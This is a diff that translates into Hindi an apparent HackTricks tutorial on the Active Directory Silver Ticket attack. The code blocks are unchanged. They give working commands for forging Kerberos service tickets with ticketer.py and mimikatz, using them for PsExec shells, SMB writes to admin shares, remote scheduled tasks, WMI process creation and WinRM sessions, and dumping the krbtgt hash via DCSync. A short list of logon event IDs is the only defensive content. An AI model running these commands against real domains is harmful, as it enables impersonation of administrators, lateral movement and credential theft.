@@ -4,26 +4,23 @@
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**Bug bounty tip**: **साइन अप करें** **Intigriti** के लिए, एक प्रीमियम **बग बाउंटी प्लेटफार्म जो हैकर्स द्वारा, हैकर्स के लिए बनाया गया है**! आज ही हमसे जुड़ें [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) पर, और **$100,000** तक के बाउंटी कमाना शुरू करें!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 ## Silver ticket
 
-The **Silver Ticket** attack involves the exploitation of service tickets in Active Directory (AD) environments. This method relies on **acquiring the NTLM hash of a service account**, such as a computer account, to forge a Ticket Granting Service (TGS) ticket. With this forged ticket, an attacker can access specific services on the network, **impersonating any user**, typically aiming for administrative privileges. It's emphasized that using AES keys for forging tickets is more secure and less detectable.
+**Silver Ticket** हमला Active Directory (AD) वातावरण में सेवा टिकटों के शोषण से संबंधित है। यह विधि **एक सेवा खाते का NTLM हैश प्राप्त करने** पर निर्भर करती है, जैसे कि एक कंप्यूटर खाता, ताकि एक Ticket Granting Service (TGS) टिकट को forge किया जा सके। इस forged टिकट के साथ, एक हमलावर नेटवर्क पर विशिष्ट सेवाओं तक पहुँच सकता है, **किसी भी उपयोगकर्ता का अनुकरण करते हुए**, आमतौर पर प्रशासनिक विशेषाधिकारों के लिए लक्ष्य बनाते हुए। यह जोर दिया गया है कि टिकटों को forge करने के लिए AES कुंजियों का उपयोग करना अधिक सुरक्षित और कम पहचानने योग्य है।
 
-For ticket crafting, different tools are employed based on the operating system:
+टिकट बनाने के लिए, विभिन्न उपकरणों का उपयोग किया जाता है जो ऑपरेटिंग सिस्टम के आधार पर होते हैं:
 
 ### On Linux
-
 ```bash
 python ticketer.py -nthash <HASH> -domain-sid <DOMAIN_SID> -domain <DOMAIN> -spn <SERVICE_PRINCIPAL_NAME> <USER>
 export KRB5CCNAME=/root/impacket-examples/<TICKET_NAME>.ccache
 python psexec.py <DOMAIN>/<USER>@<TARGET> -k -no-pass
 ```
-
-### On Windows
-
+### विंडोज़ पर
 ```bash
 # Create the ticket
 mimikatz.exe "kerberos::golden /domain:<DOMAIN> /sid:<DOMAIN_SID> /rc4:<HASH> /user:<USER> /service:<SERVICE> /target:<TARGET>"
@@ -35,47 +32,44 @@ mimikatz.exe "kerberos::ptt <TICKET_FILE>"
 # Obtain a shell
 .\PsExec.exe -accepteula \\<TARGET> cmd
 ```
+CIFS सेवा को पीड़ित की फ़ाइल प्रणाली तक पहुँचने के लिए एक सामान्य लक्ष्य के रूप में उजागर किया गया है, लेकिन HOST और RPCSS जैसी अन्य सेवाओं का भी कार्यों और WMI प्रश्नों के लिए शोषण किया जा सकता है।
 
-The CIFS service is highlighted as a common target for accessing the victim's file system, but other services like HOST and RPCSS can also be exploited for tasks and WMI queries.
+## उपलब्ध सेवाएँ
 
-## Available Services
-
-| Service Type                               | Service Silver Tickets                                                     |
+| सेवा प्रकार                                 | सेवा सिल्वर टिकट्स                                                       |
 | ------------------------------------------ | -------------------------------------------------------------------------- |
-| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                    |
-| PowerShell Remoting                        | <p>HOST</p><p>HTTP</p><p>Depending on OS also:</p><p>WSMAN</p><p>RPCSS</p> |
-| WinRM                                      | <p>HOST</p><p>HTTP</p><p>In some occasions you can just ask for: WINRM</p> |
-| Scheduled Tasks                            | HOST                                                                       |
-| Windows File Share, also psexec            | CIFS                                                                       |
-| LDAP operations, included DCSync           | LDAP                                                                       |
-| Windows Remote Server Administration Tools | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                         |
-| Golden Tickets                             | krbtgt                                                                     |
+| WMI                                        | <p>HOST</p><p>RPCSS</p>                                                  |
+| PowerShell रिमोटिंग                       | <p>HOST</p><p>HTTP</p><p>OS के आधार पर भी:</p><p>WSMAN</p><p>RPCSS</p> |
+| WinRM                                      | <p>HOST</p><p>HTTP</p><p>कुछ अवसरों पर आप बस पूछ सकते हैं: WINRM</p>   |
+| अनुसूचित कार्य                             | HOST                                                                     |
+| Windows फ़ाइल शेयर, साथ ही psexec        | CIFS                                                                     |
+| LDAP संचालन, जिसमें DCSync शामिल है      | LDAP                                                                     |
+| Windows रिमोट सर्वर प्रशासन उपकरण        | <p>RPCSS</p><p>LDAP</p><p>CIFS</p>                                       |
+| गोल्डन टिकट्स                             | krbtgt                                                                   |
 
-Using **Rubeus** you may **ask for all** these tickets using the parameter:
+**Rubeus** का उपयोग करके आप निम्नलिखित पैरामीटर का उपयोग करके **सभी** इन टिकटों के लिए **पूछ सकते हैं**:
 
 - `/altservice:host,RPCSS,http,wsman,cifs,ldap,krbtgt,winrm`
 
-### Silver tickets Event IDs
+### सिल्वर टिकट्स इवेंट आईडी
 
-- 4624: Account Logon
-- 4634: Account Logoff
-- 4672: Admin Logon
+- 4624: खाता लॉगिन
+- 4634: खाता लॉगआउट
+- 4672: व्यवस्थापक लॉगिन
 
-## Abusing Service tickets
+## सेवा टिकटों का दुरुपयोग
 
-In the following examples lets imagine that the ticket is retrieved impersonating the administrator account.
+निम्नलिखित उदाहरणों में कल्पना करें कि टिकट को व्यवस्थापक खाते का अनुकरण करते हुए पुनः प्राप्त किया गया है।
 
 ### CIFS
 
-With this ticket you will be able to access the `C$` and `ADMIN$` folder via **SMB** (if they are exposed) and copy files to a part of the remote filesystem just doing something like:
-
+इस टिकट के साथ आप `C$` और `ADMIN$` फ़ोल्डर तक पहुँचने में सक्षम होंगे **SMB** के माध्यम से (यदि वे उजागर हैं) और फ़ाइलों को दूरस्थ फ़ाइल प्रणाली के एक भाग में कॉपी कर सकते हैं, बस कुछ ऐसा करके:
 ```bash
 dir \\vulnerable.computer\C$
 dir \\vulnerable.computer\ADMIN$
 copy afile.txt \\vulnerable.computer\C$\Windows\Temp
 ```
-
-You will also be able to obtain a shell inside the host or execute arbitrary commands using **psexec**:
+आप होस्ट के अंदर एक शेल प्राप्त करने या **psexec** का उपयोग करके मनमाने आदेश निष्पादित करने में भी सक्षम होंगे:
 
 {{#ref}}
 ../lateral-movement/psexec-and-winexec.md
@@ -83,8 +77,7 @@ You will also be able to obtain a shell inside the host or execute arbitrary com
 
 ### HOST
 
-With this permission you can generate scheduled tasks in remote computers and execute arbitrary commands:
-
+इस अनुमति के साथ, आप दूरस्थ कंप्यूटरों में अनुसूचित कार्य उत्पन्न कर सकते हैं और मनमाने आदेश निष्पादित कर सकते हैं:
 ```bash
 #Check you have permissions to use schtasks over a remote server
 schtasks /S some.vuln.pc
@@ -96,11 +89,9 @@ schtasks /query /S some.vuln.pc
 #Run created schtask now
 schtasks /Run /S mcorp-dc.moneycorp.local /TN "SomeTaskName"
 ```
-
 ### HOST + RPCSS
 
-With these tickets you can **execute WMI in the victim system**:
-
+इन टिकटों के साथ आप **शिकार प्रणाली में WMI निष्पादित कर सकते हैं**:
 ```bash
 #Check you have enough privileges
 Invoke-WmiMethod -class win32_operatingsystem -ComputerName remote.computer.local
@@ -110,8 +101,7 @@ Invoke-WmiMethod win32_process -ComputerName $Computer -name create -argumentlis
 #You can also use wmic
 wmic remote.computer.local list full /format:list
 ```
-
-Find **more information about wmiexec** in the following page:
+**wmiexec** के बारे में **अधिक जानकारी** निम्नलिखित पृष्ठ पर प्राप्त करें:
 
 {{#ref}}
 ../lateral-movement/wmiexec.md
@@ -119,32 +109,28 @@ Find **more information about wmiexec** in the following page:
 
 ### HOST + WSMAN (WINRM)
 
-With winrm access over a computer you can **access it** and even get a PowerShell:
-
+winrm के माध्यम से एक कंप्यूटर पर पहुँचने पर आप **इसका उपयोग कर सकते हैं** और यहाँ तक कि एक PowerShell प्राप्त कर सकते हैं:
 ```bash
 New-PSSession -Name PSC -ComputerName the.computer.name; Enter-PSSession PSC
 ```
-
-Check the following page to learn **more ways to connect with a remote host using winrm**:
+इस पृष्ठ को देखें ताकि आप **winrm का उपयोग करके एक दूरस्थ होस्ट से कनेक्ट करने के अधिक तरीके** जान सकें:
 
 {{#ref}}
 ../lateral-movement/winrm.md
 {{#endref}}
 
 > [!WARNING]
-> Note that **winrm must be active and listening** on the remote computer to access it.
+> ध्यान दें कि **winrm को दूरस्थ कंप्यूटर पर सक्रिय और सुनने वाला होना चाहिए** ताकि आप इसे एक्सेस कर सकें।
 
 ### LDAP
 
-With this privilege you can dump the DC database using **DCSync**:
-
+इस विशेषाधिकार के साथ आप **DCSync** का उपयोग करके DC डेटाबेस को डंप कर सकते हैं:
 ```
 mimikatz(commandline) # lsadump::dcsync /dc:pcdc.domain.local /domain:domain.local /user:krbtgt
 ```
+**DCSync के बारे में अधिक जानें** निम्नलिखित पृष्ठ पर:
 
-**Learn more about DCSync** in the following page:
-
-## References
+## संदर्भ
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/kerberos-silver-tickets)
 - [https://www.tarlogic.com/blog/how-to-attack-kerberos/](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
@@ -155,9 +141,8 @@ dcsync.md
 
 <figure><img src="../../images/i3.png" alt=""><figcaption></figcaption></figure>
 
-**Bug bounty tip**: **sign up** for **Intigriti**, a premium **bug bounty platform created by hackers, for hackers**! Join us at [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) today, and start earning bounties up to **$100,000**!
+**बग बाउंटी टिप**: **साइन अप करें** **Intigriti** के लिए, एक प्रीमियम **बग बाउंटी प्लेटफॉर्म जो हैकर्स द्वारा, हैकर्स के लिए बनाया गया है**! आज ही [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) पर हमारे साथ जुड़ें, और **$100,000** तक की बाउंटी कमाना शुरू करें!
 
 {% embed url="https://go.intigriti.com/hacktricks" %}
 
 {{#include ../../banners/hacktricks-training.md}}
-
